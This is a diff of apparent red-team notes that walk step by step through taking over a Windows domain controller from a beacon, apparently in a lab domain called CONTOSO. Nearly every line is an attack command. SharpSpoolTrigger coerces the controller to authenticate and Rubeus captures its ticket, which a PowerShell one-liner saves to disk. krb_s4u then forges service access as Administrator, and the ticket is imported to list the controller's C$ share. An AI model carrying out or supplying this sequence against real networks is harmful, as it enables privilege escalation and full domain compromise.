@@ -21,8 +21,21 @@ now monitor via rubeus
 now force the computer auth
     beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
 
-store the ticket and kill rubeus monitor
+store the ticket via Powershell one-liner
+    powershell> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\tgt.kirbi", [Convert]::FromBase64String("[ticket]"))
+
+kill rubeus monitor
     beacon> jobkill 0
 
-computers dont get access the way users day, so now use krb_s4u to get a usable service ticket
+computers dont get access the way users do, so now use krb_s4u to get a usable service ticket as our desired user
     beacon> krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
+
+now we store the returned ticket and inspect
+    beacon> krb_describe /ticket:[TGT]
+
+now let's import the ticket! 
+    beacon> make_token CONTOSO\Administrator FakePass
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\tgt.kirbi
+
+now we can access the DC!
+    beacon> ls \\lon-dc-1\c$
